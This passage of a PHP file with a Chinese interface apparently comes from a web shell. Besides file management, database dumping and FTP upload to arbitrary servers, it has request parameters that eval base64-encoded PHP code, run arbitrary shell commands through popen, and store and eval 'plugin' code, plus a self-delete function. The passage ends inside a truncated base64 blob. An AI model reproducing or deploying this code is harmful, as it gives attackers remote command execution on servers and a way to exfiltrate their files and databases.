        $content .= "<option value=\"" . $dir . "/\">" . $dir . "/</option>";
    }
}


/****************************************************************/
/* function mov()                                               */
/*                                                              */
/* First step in move.                                          */
/* Prompts the user for destination path.                       */
/* Recieves $file and sends to move().                          */
/****************************************************************/
function mov($file)
{
    global $folder, $content, $filefolder;
    if (!$file == "") {
        maintop("移动");
        echo "<form action=\"" . $adminfile . "?op=move\" method=\"post\">\n" . "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "移动 " . $folder . $file . " 到:\n" . "<select name=ndir size=1>\n" . "<option value=\"" . $filefolder . "\">" . $filefolder . "</option>";
        listdir($filefolder);
        echo $content . "</select>" . "</table><br><input type=\"hidden\" name=\"file\" value=\"" . $file . "\">\n" . "<input type=\"hidden\" name=\"folder\" value=\"" . $folder . "\">\n" . "<input type=\"Submit\" value=\"移动\" class=\"button\">\n" . "<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a>\n";
        mainbottom();
    } else {
        home();
    }
}

/****************************************************************/
/* function cop()                                               */
/*                                                              */
/* First step in xcop.                                          */
/* Prompts the user for destination path.                       */
/* Recieves $file and sends to xcop().                          */
/****************************************************************/
function cop($file)
{
    global $folder, $content, $filefolder;
    if (!$file == "") {
        maintop("复制");
        echo "<form action=\"" . $adminfile . "?op=xcop\" method=\"post\">\n" . "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "复制 " . $folder . $file . " 到:\n" . "<select name=ndir size=1>\n" . "<option value=\"" . $filefolder . "\">" . $filefolder . "</option>";
        listdir($filefolder);
        echo $content . "</select>" . "</table><br><input type=\"hidden\" name=\"file\" value=\"" . $file . "\">\n" . "<input type=\"hidden\" name=\"folder\" value=\"" . $folder . "\">\n" . "<input type=\"Submit\" value=\"复制\" class=\"button\">\n" . "<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a>\n";
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function move()                                              */
/*                                                              */
/* Second step in move.                                         */
/* Moves the oldfile to the new one.                            */
/* Recieves $file and $ndir and creates $file.$ndir             */
/****************************************************************/
function move($file, $ndir, $folder)
{
    global $folder;
    if (!$file == "") {
        maintop("移动");
        if (rename($folder . $file, $ndir . $file)) {
            echo $folder . $file . " 已经成功移动到 " . $ndir . $file . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        } else {
            echo "无法移动 " . $folder . $file . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        }
        mainbottom();
    } else {
        home();
    }
}
function copy_dir($source, $dest)
{
    $result = false;
    if (is_file($source)) {
        if ($dest[strlen($dest) - 1] == '/') {
            $__dest = $dest . "/" . basename($source);
        } else {
            $__dest = $dest;
        }
        $result = @copy($source, $__dest);
        //echo iconv( $config['app_charset'],$config['system_charset'], $source);
        @chmod($__dest, 0755);
    } elseif (is_dir($source)) {
        if ($dest[strlen($dest) - 1] == '/') {
            $dest = $dest . basename($source);
            @mkdir($dest);
            @chmod($dest, 0755);
        } else {
            @mkdir($dest, 0755);
            @chmod($dest, 0755);
        }
        $dirHandle = opendir($source);
        while ($file = readdir($dirHandle)) {
            if ($file != "." && $file != "..") {
                if (!is_dir($source . "/" . $file)) {
                    $__dest = $dest . "/" . $file;
                } else {
                    $__dest = $dest . "/" . $file;
                }
                $result = copy_dir($source . "/" . $file, $__dest);
            }
        }
        closedir($dirHandle);
    } else {
        $result = false;
    }
    return $result;
}
/****************************************************************/
/* function xcop()                                              */
/*                                                              */
/* Second step in xcop.                                         */
/* Moves the oldfile to the new one.                            */
/* Recieves $file and $ndir and creates $file.$ndir             */
/****************************************************************/
function xcop($file, $ndir, $folder)
{
    global $folder;
    if (!$file == "") {
        maintop("复制");
        if (copy_dir($folder . $file, $ndir . $file)) {
            echo $folder . $file . " 已经成功复制到 " . $ndir . $file . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        } else {
            echo "无法复制 " . $folder . $file . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
        }
        mainbottom();
    } else {
        home();
    }
}


/****************************************************************/
/* function viewframe()                                         */
/*                                                              */
/* First step in viewframe.                                     */
/* Takes the specified file and displays it in a frame.         */
/* Recieves $file and sends it to viewtop                       */
/****************************************************************/
function viewframe($file)
{
    global $sitetitle, $folder, $HTTP_HOST, $filefolder;
    if ($filefolder == "/") {
        $error = "**错误: 你选择查看$file 但你的目录是 /.**";
        printerror($error);
        die();
    } elseif (ereg("/home/", $folder)) {
        $folderx = ereg_replace("$filefolder", "", $folder);
        $folder  = "http://" . $HTTP_HOST . "/" . $folderx;
    }
    maintop("查看文件", true);
    
    echo "<iframe width=\"1000px\" height=\"500px\" src=\"" . $folder . $file . "\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"auto\" allowtransparency=\"yes\">\n" . "本站使用了框架技术,但是您的浏览器不支持框架,请升级您的浏览器以便正常访问本站." . "</iframe>\n\n\n<br>";
    mainbottom();
}
/****************************************************************/
/* function CJ()                                         */
/*                                                              */
/* First step in viewframe.                                     */
/* Takes the specified file and displays it in a frame.         */
/* Recieves $file and sends it to viewtop                       */
/****************************************************************/
$config=".gftp";
function cj($name)
{
    global $sitetitle, $folder, $HTTP_HOST, $filefolder;
    
    maintop($name." - 插件", true);
    
    
    echo "<iframe width=\"1000px\" height=\"500px\" src=\"" . $adminfile . "?op=cjx&name=$name\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"auto\" allowtransparency=\"yes\">\n" . "本站使用了框架技术,但是您的浏览器不支持框架,请升级您的浏览器以便正常访问本站." . "</iframe>\n\n";
    mainbottom();
}
function rst(){
global $config;
preg_match_all("/\/\*cj_start\*\/(.*?)\/\*cj_end\*\//is", file_get_contents($config), $match);
if($match[0][0]){
return $match[0][0];
}else{
$sx="/*cj_start*/
/*cj_end*/";
file_put_contents($config,$sx);
return $sx;
}
}

function rcj($name){
   preg_match_all('/\/\*data-'.$name.'\*\/(.*?)\/\*data-'.$name.'\*\//is', rst(), $match);
   return $match[0][0];
}
function ecj($name){
      global $config;
    eval(file_get_contents($config));
    maintop($name." - 修改插件", true);
   preg_match_all('/\$data\_'.$name.'\=\"(.*?)\"\;/is', rst(), $match);
  // return $match[1][0];
  $dd=base64_decode($match[1][0]);
   	echo"<form action=\"$adminfile?op=scj\" method=\"post\"><br>插件名称<br><input style=\"width:100%\" name=\"name\" id=\"name\" value=\"$name\"/><br>插件源码<br><textarea  style=\"width:100%;height:400px;\" name=\"data\" id=\"data\">$dd</textarea><br><input type=\"submit\"  value=\"添加\">&nbsp;<a href=\"$adminfile?op=lcj\">取消</a></form>";
    mainbottom();
}
function ncj(){
   preg_match_all('/\$data\_(.*?)\=\"/is', rst(), $match);
   return $match[1];
}
function scj($name,$data){
global $config;
dcj($name);
$s0=rst();

$ss='/*data-'.$name.'*/$data_'.$name.'="'.$data.'";/*data-'.$name.'*/';
//echo $ss;
$s1=str_replace("/*cj_end*/",$ss."
/*cj_end*/",$s0);

$s2=file_get_contents($config);
$sx=str_replace($s0,$s1,$s2);
file_put_contents($config,$sx);
//header("Location: $adminfile?op=lcj");
}
function dcj($name,$kg=null)
{
global $config;
$s0=rcj($name);

$s1=file_get_contents($config);
if($s0){
$sx=str_replace($s0."
","",$s1);
file_put_contents($config,$sx);
}
}
function lcj()
{
      global $config;
    eval(file_get_contents($config));
    maintop("插件管理", true);
    $nn=ncj();
	 echo "<span>已安装的插件&nbsp;<button onclick=\"window.location.href='$adminfile?op=acj'\">添加</button></span><br><table style=\"width:100%\">";
 
 for($i=0;$i<count($nn);$i++){
 $ii=$nn[$i];

  echo "<tr><td style=\"width:75%\"><span>$ii</span></td><td><button onclick=\"window.location.href='$adminfile?op=cj&name=$ii'\">打开</button><button  onclick=\"window.location.href='$adminfile?op=ecj&name=$ii'\">编辑</button><button onclick=\"window.location.href='$adminfile?op=dcj&name=$ii'\">删除</button></td></tr>";
 }
 echo " </table>";
       mainbottom();

}
function acj()
{
    maintop("添加插件", true);
     global $config;
   	echo"<form action=\"$adminfile?op=scj\" method=\"post\"><br>插件名称<br><input style=\"width:100%\" name=\"name\" id=\"name\" value=\"$name\"/><br>插件源码<br><textarea style=\"width:100%;height:400px;\" name=\"data\" id=\"data\"></textarea><br><input type=\"submit\"  value=\"添加\">&nbsp;<a href=\"$adminfile?op=lcj\">取消</a></form>";
    mainbottom();
}


/****************************************************************/
/* function TZ()                                         */
/*                                                              */
/* First step in viewframe.                                     */
/* Takes the specified file and displays it in a frame.         */
/* Recieves $file and sends it to viewtop                       */
/****************************************************************/
function tz()
{
    //global $sitetitle, $folder, $HTTP_HOST, $filefolder;
    
    maintop("雅黑探针 - Gentle版", true);
    
    
    echo "<iframe width=\"1000px\" height=\"500px\" src=\"" . $adminfile . "?op=tzx\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"auto\" allowtransparency=\"yes\">\n" . "本站使用了框架技术,但是您的浏览器不支持框架,请升级您的浏览器以便正常访问本站." . "</iframe>\n\n";
    mainbottom();
}
/****************************************************************/
/* function SQL()                                         */
/*                                                              */
/* First step in viewframe.                                     */
/* Takes the specified file and displays it in a frame.         */
/* Recieves $file and sends it to viewtop                       */
/****************************************************************/
function sql()
{
    //global $sitetitle, $folder, $HTTP_HOST, $filefolder;
    
    maintop("数据库管理", true);
    
    
    echo "<iframe width=\"1000px\" height=\"500px\" src=\"" . $adminfile . "?op=sqx\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"auto\" allowtransparency=\"yes\">\n" . "本站使用了框架技术,但是您的浏览器不支持框架,请升级您的浏览器以便正常访问本站." . "</iframe>\n\n";
    mainbottom();
}



/****************************************************************/
/* function download()                                         */
/*                                                              */
/* First step in download.                                     */
/* Takes the specified file and displays it in a frame.         */
/* Recieves $file and sends it to viewtop                       */
/****************************************************************/
function download($file)
{
    global $sitetitle, $folder, $HTTP_HOST, $filefolder;
    if ($filefolder == "/") {
        $error = "**错误: 你选择查看$file 但你的目录是 /.**";
        printerror($error);
        die();
    } elseif (ereg("/home/", $folder)) {
        $folderx = ereg_replace("$filefolder", "", $folder);
        $folder  = "http://" . $HTTP_HOST . "/" . $folderx;
    }
    
    // maintop("查看文件",true);
    Header("Content-type: application/octet-stream");
    header("Content-Disposition: attachment; filename=" . str_replace('./', '', $file) . ";");
    echo file_get_contents($folder . $file);
    // echo " <script>window.open('".$folder.$file."','_blank');window.open('".$SCRIPT_NAME.'?op='.$folder."','_top');</script>\n\n";
    // mainbottom();
    
}


/****************************************************************/
/* function viewtop()                                           */
/*                                                              */
/* Second step in viewframe.                                    */
/* Controls the top bar on the viewframe.                       */
/* Recieves $file from viewtop.                                 */
/****************************************************************/
function viewtop($file)
{
    global $viewing, $iftop;
    $viewing = "yes";
    $iftop   = "target=_top";
    maintop("查看文件 - $file");
}


/****************************************************************/
/* function logout()                                            */
/*                                                              */
/* Logs the user out and kills cookies                          */
/****************************************************************/
function logout()
{
    global $login;
    setcookie("user", "", time() - 60 * 60 * 24 * 1);
    setcookie("pass", "", time() - 60 * 60 * 24 * 1);
    
    maintop("退出", false);
    echo "你已经退出." . "<br><br>" . "<a href=" . $adminfile . "?op=home>点击这里重新登录.</a>";
    mainbottom();
}


/****************************************************************/
/* function mainbottom()                                        */
/*                                                              */
/* Controls the bottom copyright.                               */
/****************************************************************/
function mainbottom()
{
    echo "</table></table>\n" . "<table width=100%><tr><td align=right><font class=copyright>Powered By <a target='_blank' href=http://www.wmmw.ml/>唯美诗意</a> & <a target='_blank' href=http://www.gwfs.ml/>天狼星の破晓</a></font></table>\n" . "</table></table></body>\n" . "</html>\n";
    exit;
}

/****************************************************************/
/* function sqlb()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/

function sqlb()
{
    maintop("数据库备份");
    echo $content . "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><font class=error>**警告: 这将进行数据库导出并压缩成mysql.zip的动作! 如存在该文件,该文件将被覆盖!**</font><br><br><form action=\"" . $adminfile . "?op=sqlbackup\" method=\"POST\">数据库地址:&nbsp;&nbsp;<input name=\"ip\" size=\"30\" /><br>数据库名称:&nbsp;&nbsp;<input name=\"sql\" size=\"30\" /><br>数据库用户:&nbsp;&nbsp;<input name=\"username\" size=\"30\" /><br>数据库密码:&nbsp;&nbsp;<input name=\"password\" size=\"30\" /><br>数据库编码:&nbsp;&nbsp;<select id=\"chset\"><option id=\utf8\">utf8</option></select><br><input name=\"submit\" value=\"备份\" type=\"submit\" />\n<a href=\"" . $adminfile . "?op=home\"> 取消 </a></form>\n";
    mainbottom();
}

/****************************************************************/
/* function sqlbackup()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function sqlbackup($ip, $sql, $username, $password)
{
    maintop("数据库备份");
    $database = $sql; //数据库名
    $options  = array(
        'hostname' => $ip, //ip地址
        'charset' => 'utf8', //编码
        'filename' => $database . '.sql', //文件名
        'username' => $username,
        'password' => $password
    );
    mysql_connect($options['hostname'], $options['username'], $options['password']) or die("不能连接数据库!");
    mysql_select_db($database) or die("数据库名称错误!");
    mysql_query("SET NAMES '{$options['charset']}'");
    $tables   = list_tables($database);
    $filename = sprintf($options['filename'], $database);
    $fp       = fopen($filename, 'w');
    foreach ($tables as $table) {
        dump_table($table, $fp);
    }
    fclose($fp);
    //压缩sql文件
    if (file_exists('mysql.zip')) {
        unlink('mysql.zip');
    } else {
    }
    $file_name = $options['filename'];
    $zip       = new ZipArchive;
    $res       = $zip->open('mysql.zip', ZipArchive::CREATE);
    if ($res === TRUE) {
        $zip->addfile($file_name);
        $zip->close();
        //删除服务器上的sql文件
        unlink($file_name);
        echo '数据库导出并压缩完成！' . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n";
    } else {
        echo '数据库导出并压缩失败！' . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n";
    }
    exit;
    //获取表的名称
    mainbottom();
}

function list_tables($database)
{
    $rs     = mysql_list_tables($database);
    $tables = array();
    while ($row = mysql_fetch_row($rs)) {
        $tables[] = $row[0];
    }
    mysql_free_result($rs);
    return $tables;
}
//导出数据库
function dump_table($table, $fp = null)
{
    $need_close = false;
    if (is_null($fp)) {
        $fp         = fopen($table . '.sql', 'w');
        $need_close = true;
    }
    $a   = mysql_query("show create table `{$table}`");
    $row = mysql_fetch_assoc($a);
    fwrite($fp, $row['Create Table'] . ';'); //导出表结构
    $rs = mysql_query("SELECT * FROM `{$table}`");
    while ($row = mysql_fetch_row($rs)) {
        fwrite($fp, get_insert_sql($table, $row));
    }
    mysql_free_result($rs);
    if ($need_close) {
        fclose($fp);
    }
}
//导出表数据
function get_insert_sql($table, $row)
{
    $sql    = "INSERT INTO `{$table}` VALUES (";
    $values = array();
    foreach ($row as $value) {
        $values[] = "'" . mysql_real_escape_string($value) . "'";
    }
    $sql .= implode(', ', $values) . ");";
    return $sql;
}

function z($dename)
{
    //die($dename);
    global $folder;
    if (is_dir($folder . $dename)) {
        $ss = "目录";
    } else {
        $ss = "文件";
    }
    maintop($ss . "压缩");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n" . "<font class=error>**警告: 这将进行" . $ss . "压缩为" . $folder . $dename . ".zip的动作! 如存在该文件，该文件将被覆盖!**</font><br><br>\n" . "确定要进行" . $ss . "压缩?<br><br>\n" . "<a href=\"" . $adminfile . "?op=zip&dename=" . $dename . "&folder=" . $folder . "\">确定</a> | \n" . "<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a>\n" . "</table>\n";
    mainbottom();
}

function zip($dename)
{
    global $folder;
    $path = $folder . $dename; //die($folder.$dename);
    if (is_dir($path)) {
        $ss = "目录";
    } else {
        $ss = "文件";
    }
    maintop($ss . "压缩");
    if (file_exists($path . '.zip')) {
        unlink($path . '.zip');
    } else {
    }
    class Zipper extends ZipArchive
    {
        public function addDir($path)
        {
            
            if (is_dir($path)) {
                
                global $folder;
                //echo (str_replace( $folder,'',$path));
                if ($path != '.') {
                    $this->addEmptyDir(str_replace($folder, '', $path));
                }
                
                print 'adding ' . $path . '<br>';
                $nodes = glob($path . '/'.'{,.}*', GLOB_BRACE);
                foreach ($nodes as $node) {
				if(($node!=$path.'/.')&&($node!=$path.'/..')){
                    print $node . '<br>';
                    if (is_dir($node)) {
                        $this->addDir($node);
                    } else if (is_file($node)) {
                        //echo str_replace( $folder,'',$node);
                        $this->addFile($node, str_replace($folder, '', $node));
                    }
					}
					
                }
            } else {
                $path = str_replace('./', '', $path);
                $this->addFile($path);
                
            }
            
        }
    }
    $zip = new Zipper;
    $res = $zip->open($path . '.zip', ZipArchive::CREATE);
    if ($res === TRUE) {
        $zip->addDir($path);
        $zip->close();
        echo '压缩完成！' . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
    } else {
        echo '压缩失败！' . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n&nbsp;<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\">返回上一级目录</a>\n";
    }
    mainbottom();
}

function killme($dename)
{
    global $folder;
    if (!$dename == "") {
        maintop("自杀");
        if (unlink($folder . $dename)) {
            echo "自杀成功. " . "&nbsp;<a href=" . $folder . ">返回网站首页</a>\n";
        } else {
            echo "无法自杀. " . "&nbsp;<a href=\"/\">返回网站首页</a>\n";
        }
        mainbottom();
    } else {
        home();
    }
}



/****************************************************************/
/* function ftpa()                                              */
/*                                                              */
/* First step to backup sql.                                    */
/****************************************************************/

function ftpa($dename)
{
    global $folder;
    $path = $folder . $dename; //die($folder.$dename);
    maintop("FTP功能");
    echo $content . "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\"></table><font class=error>**警告: 这将把文件远程上传到其他ftp! 如目录存在该文件,文件将被覆盖!**</font><br><br><form action=\"" . $adminfile . "?op=ftpall\" method=\"POST\">FTP&nbsp;地址:&nbsp;&nbsp;<input name=\"ftpip\" size=\"30\" /><br>FTP&nbsp;用户:&nbsp;&nbsp;<input name=\"ftpuser\" size=\"30\"/><br>FTP&nbsp;密码:&nbsp;&nbsp;<input name=\"ftppass\" size=\"30\" /><br>FTP&nbsp;文件:&nbsp;&nbsp;<input name=\"ftpfile\" size=\"30\" value=\"" . $path . "\" /><br><input name=\"submit\" value=\"备份\" type=\"submit\" />\n<a href=\"" . $adminfile . "?op=home&folder=" . $folder . "\"> 取消 </a></form>\n";
    mainbottom();
}

/****************************************************************/
/* function ftpall()                                         */
/*                                                              */
/* Second step in backup sql.                                   */
/****************************************************************/
function ftpall($ftpip, $ftpuser, $ftppass, $ftpfile)
{
    maintop("FTP功能");
    $ftp_server    = $ftpip; //服务器
    $ftp_user_name = $ftpuser; //用户名
    $ftp_user_pass = $ftppass; //密码
    $ftp_port      = '21'; //端口
    $ftp_put_dir   = './'; //上传目录
    $ffile         = $ftpfile; //上传文件
    
    $ftp_conn_id      = ftp_connect($ftp_server, $ftp_port);
    $ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);
    
    if ((!$ftp_conn_id) || (!$ftp_login_result)) {
        echo "连接到ftp服务器失败";
        exit;
    } else {
        ftp_pasv($ftp_conn_id, true); //返回一下模式，这句很奇怪，有些ftp服务器一定需要执行这句
        ftp_chdir($ftp_conn_id, $ftp_put_dir);
        $ftp_upload = ftp_put($ftp_conn_id, $ffile, $ffile, FTP_BINARY);
        //var_dump($ftp_upload);//看看是否写入成功
        ftp_close($ftp_conn_id); //断开
    }
    echo "文件 " . $ftpfile . " 上传成功.\n" . "&nbsp;<a href=\"" . $adminfile . "?op=home\">返回文件管理</a>\n";
    mainbottom();
}

/****************************************************************/
/* function printerror()                                        */
/*                                                              */
/* Prints error onto screen                                     */
/* Recieves $error and prints it.                               */
/****************************************************************/
function printerror($error)
{
    maintop("错误");
    echo "<font class=error>\n" . $error . "\n</font>";
    mainbottom();
}


/****************************************************************/
/* function switch()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $op() and switches to it                            *.
/****************************************************************/
switch ($op) {
    
    case "home":
        home();
        break;
    case "up":
        up();
        break;
    case "yupload":
        yupload($_POST['url']);
        break;
    case "upload":
        upload($_FILES['upfile'], $_REQUEST['ndir']);
        break;
    
    case "del":
        del($_REQUEST['dename']);
        break;
    
    case "delete":
        delete($_REQUEST['dename']);
        break;
    
    case "unz":
        unz($_REQUEST['dename']);
        break;
    
    case "unzip":
        unzip($_REQUEST['dename']);
        break;
    
    case "sqlb":
        sqlb();
        break;
    
    case "sqlbackup":
        sqlbackup($_POST['ip'], $_POST['sql'], $_POST['username'], $_POST['password']);
        break;
    
    case "ftpa":
        ftpa($_REQUEST['file']);
        break;
    
    case "ftpall":
        ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['ftpfile']);
        break;
    
    case "allz":
        allz();
        break;
    
    case "allzip":
        allzip();
        break;
    
    case "edit":
        edit($_REQUEST['fename']);
        break;
    
    case "save":
        save($_REQUEST['ncontent'], $_REQUEST['fename']);
        break;
    
    case "cr":
        cr();
        break;
    
    case "create":
        create($_REQUEST['nfname'], $_REQUEST['isfolder'], $_REQUEST['ndir']);
        break;
    
    case "chm":
        chm($_REQUEST['file']);
        break;
    
    case "chmodok":
        chmodok($_REQUEST['rename'], $_REQUEST['nchmod'], $folder);
        break;
    
    case "ren":
        ren($_REQUEST['file']);
        break;
    
    case "rename":
        renam($_REQUEST['rename'], $_REQUEST['nrename'], $folder);
        break;
    
    case "mov":
        mov($_REQUEST['file']);
        break;
    
    case "cop":
        cop($_REQUEST['file']);
        break;
    
    case "move":
        move($_REQUEST['file'], $_REQUEST['ndir'], $folder);
        break;
    
    case "xcop":
        xcop($_REQUEST['file'], $_REQUEST['ndir'], $folder);
        break;
    
    case "viewframe":
        viewframe($_REQUEST['file']);
        break;
    
    case "tz":
        tz();
        break;
    
    case "tzx":
        tzx();
        break;
	case "lcj":
        lcj();
        break;	
     case "cj":
        cj($_REQUEST['name']);
        break;
       case "acj":
      acj($_REQUEST['name']);
        break;
		   case "dcj":
        dcj($_REQUEST['name']);
		header("Location: $adminfile?op=lcj");
        break;
        case "scj":
        scj($_REQUEST['name'],base64_encode($_REQUEST['data']));
		header("Location: $adminfile?op=lcj");
        break;
        case "ecj":
        ecj($_REQUEST['name']);
		
        break;		
    case "cjx":
        cjx($_REQUEST['name']);
        break;	
    
    case "sql":
        sql();
        break;
    
    case "sqx":
        sqx();
        break;
    
    case "run":
        edit();
        break;
		
	case "editor":
        die('<style type="text/css">#e{position:absolute;top:0;right:0;bottom:0;left:0;}</style><div id="e"></div><script src="http://d1n0x3qji82z53.cloudfront.net/src-min-noconflict/ace.js" type="text/javascript" charset="utf-8"></script><script>var e=ace.edit("e");e.setTheme("ace/theme/monokai");e.getSession().setUseWrapMode(true);e.getSession().setMode("ace/mode/javascript");</script>');
        break;	
    
    case "rux":
        if ($_REQUEST[phpcode]) {
            @eval(base64_decode($_REQUEST[phpcode]));
            die();
        }
        break;
	
    case "gc":
        if ($_REQUEST[path]) {
            echo @gcx(base64_decode($_REQUEST[path]));
            die();
        }
        break;	
    case "ejm":
        if ($_REQUEST[path]) {
            echo @ejx(base64_decode($_REQUEST[path]));
            die();
        }
        break;
		
    case "djm":
        if ($_REQUEST[path]) {
            echo (@djx(base64_decode($_REQUEST[path])));
            die();
        }
        break;			
    
    case "dfile":
        $n = "test_" . time() . ".html";
        if ($_REQUEST['dfilecode']) {
            Header("Content-type: application/octet-stream");
            header("Content-Disposition: attachment; filename=$n;");
            die((base64_decode($_REQUEST['dfilecode'])));
        }
        break;
    
    case "ssh":
        ssh(base64_decode($_REQUEST['sshcode']));
        break;
		
      case "shx":
	  set_time_limit(0);
	  echo "<style>html{background:black;color:white;font-family:\"Microsoft YaHei\";}</style>";
	  $handle = popen(base64_decode($_REQUEST['sshcode'])."  2>&1", 'r');
while(!feof($handle)) {
    $buffer = fgets($handle);
	$buffer=trim(htmlspecialchars($buffer));
    echo "$buffer<br/>\n";
    ob_flush();
    flush();
}
pclose($handle);

       // die(str_replace("\n", "<br>", iconv("gbk","UTF-8//IGNORE",shell_exec(base64_decode($_REQUEST['sshcode'])))));
        break;
		
    case "download":
        download($_REQUEST['file']);
        break;
    
    case "viewtop":
        viewtop($_REQUEST['file']);
        break;
    
    case "printerror":
        printerror($error);
        break;
    
    case "logout":
        logout();
        break;
    
    case "z":
        z($_REQUEST['dename']);
        break;
    
    case "zip":
        zip($_REQUEST['dename']);
        break;
    
    case "killme":
        killme($_REQUEST['dename']);
        break;
    
    default:
        home();
        break;
}
/****************************************************************/
/* function tzx()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $tz() and switches to it                            *.
/****************************************************************/
function cjx($name)
{
global $config;
eval(file_get_contents($config));
    $data =eval('return $data_'.$name.';');
    eval(base64_decode($data));
}
/****************************************************************/
/* function tzx()                                            */
/*                                                              */
/* Switches functions.                                          */
/* Recieves $tz() and switches to it                            *.
/****************************************************************/
function tzx()
{
    $data = "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